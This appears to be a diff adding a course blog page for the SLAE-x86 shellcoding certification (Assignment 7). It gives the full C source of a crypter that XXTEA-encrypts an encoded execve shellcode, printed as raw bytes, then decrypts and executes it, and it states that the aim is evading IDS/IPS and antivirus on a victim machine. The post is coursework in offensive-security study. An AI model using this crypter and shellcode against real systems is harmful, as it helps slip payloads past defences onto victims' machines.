@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ff3500eed5a75a68d749d7b17422f0859d1af87a">
+
+<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Assignment 7 | SLAE-x86</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Assignment 7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="x86 Assembly Language and Shellcoding on Linux" />
+<meta property="og:description" content="x86 Assembly Language and Shellcoding on Linux" />
+<link rel="canonical" href="http://localhost:4000/06_crypter/" />
+<meta property="og:url" content="http://localhost:4000/06_crypter/" />
+<meta property="og:site_name" content="SLAE-x86" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/06_crypter/","headline":"Assignment 7","description":"x86 Assembly Language and Shellcoding on Linux","@type":"WebPage","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>SLAE-x86</h1>
+        <h2>x86 Assembly Language and Shellcoding on Linux</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/parzio/SLAE-x86" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="assignment-7">Assignment 7</h1>
+
+<ul>
+  <li>Create a custom crypter like the one shown in the “crypters” video</li>
+  <li>Free to use any encryption schema</li>
+  <li>Can use any programming language</li>
+</ul>
+
+<h2 id="execution">Execution</h2>
+
+<p>If encoding a shellcode minimizes the surface fingerprintable, a crypter can do more, in fact, the whole shellcode get encrypted (also the encoding routine if any). The use of a crypter is very useful in those scenario where an executable has to land to the victim machine passing through network analysis (IPS/IDS) or endpoint antivirus.</p>
+
+<p>When talking about shellcode, size does matter, thus I looked for a very small encryption algorithm. I decided to go for XXTEA that is an improvement of the TEA algorithm (<a href="https://en.wikipedia.org/wiki/XXTEA">https://en.wikipedia.org/wiki/XXTEA</a>).</p>
+
+<p>The following is the crypter/decrypter implemented; note that:</p>
+
+<ol>
+  <li>The shellcode used is the execve shellcode encoded in the assignment 4;</li>
+  <li>The key is hardcoded.</li>
+</ol>
+
+<p>Obviously, the encryption and decryption routine in a real case scenario are separated, but for clarity and testing purpose it was decided to have a unique executable for both phases.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+// Author: Alessio Parzian
+// Filename: shellcode_crypter.c
+//
+// Encrypt a shellcode using the XXTEA algorithm: https://github.com/xxtea/xxtea-c
+// Compile with:
+// 	gcc -fno-stack-protector -z execstack shellcode_crypter.c -o shellcode_crypter
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include "xxtea.c"
+</span>
+<span class="cp">#define SHELLCODELENGTH 103
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x2d\x5e\x31\xdb\x31\xc9\x31\xd2\xb1\x32\x8a\x1e\x80\xf3\xbb\x80\xe3\xff\x8a\x16\x80\xf2\xbb\x80\xe2\xff\xc0\xc3\x02\x80\xe3\xff\xc0\xca\x06\x20\xd3\xf6\xd3\x88\x1e\x46\xe2\xde\xeb\x05\xe8\xce\xff\xff\xff\xbe\xc2\xd3\x08\xb2\x66\xd3\x06\x26\xd9\xc6\x26\xd3\xc7\x27\xc3\x27\xd7\xc6\x27\xd1\xc7\x08\x74\x68\x86\x37\x64\x7e\x3c\xbb\xbb\xbb\x8f\xdc\x1e\xdf\x8f\xdc\x1c\x98\x5e\x14\xd4\xd4\xd4\xd4\x94\x94\x94\x94</span><span class="s">"</span><span class="p">;</span>
+<span class="kt">char</span><span class="o">*</span> <span class="n">key</span> <span class="o">=</span> <span class="s">"w00tw00tw00tw00t"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">encrypt_data</span> <span class="o">=</span> <span class="n">xxtea_encrypt</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"======================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode encrypted:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"======================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">encrypt_data</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">0x%02x"</span><span class="p">,</span> <span class="n">encrypt_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"----------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">decrypt_data</span> <span class="o">=</span> <span class="n">xxtea_decrypt</span><span class="p">(</span><span class="n">encrypt_data</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">decrypt_data</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Encryption success!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Encryption fail!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"======================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"======================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode decrypted:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"======================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode_decrypted</span><span class="p">[</span><span class="n">SHELLCODELENGTH</span><span class="p">];</span>
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">SHELLCODELENGTH</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+    	<span class="n">shellcode_decrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">decrypt_data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">0x%02x"</span><span class="p">,</span> <span class="n">decrypt_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+	<span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">======================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">encrypt_data</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">decrypt_data</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Running Shell..</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="n">shell</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">shellcode_decrypted</span><span class="p">;</span>
+    <span class="n">shell</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The output of the above executable is shown in the following figure.</p>
+
+<p><img src="/06_crypter/test.png" alt="Crypter" /></p>
+
+<p>Well, this concludes assignment 7!</p>
+
+<p><br /></p>
+
+<hr />
+
+<p><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</em></p>
+
+<p><a href="http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert">http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert</a></p>
+
+<p><em>Student-ID: PA-8733</em></p>
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
